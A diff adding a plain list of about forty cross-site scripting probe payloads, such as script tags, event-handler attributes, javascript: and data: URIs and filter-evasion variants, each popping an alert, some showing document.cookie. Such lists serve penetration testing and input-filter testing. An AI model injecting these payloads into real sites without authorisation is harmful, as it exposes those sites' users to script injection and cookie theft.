@@ -1,0 +1,42 @@
+# XSS Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(document.domain)>
+<iframe src="javascript:alert(1)">
+<iframe src="javascript:alert(document.cookie)">
+<input onfocus=alert(1) autofocus>
+<input onmouseover=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">Click</a>
+<a href="javascript:alert(document.cookie)">Click</a>
+<div onmouseover=alert(1)>hover me</div>
+<div onmouseenter=alert(1)>hover</div>
+<form><button formaction="javascript:alert(1)">X</button>
+<select onfocus=alert(1) autofocus>
+<textArea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'-alert(1)-'
+';alert(1);'
+javascript:alert(1)
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="javascript://alert(1)//">
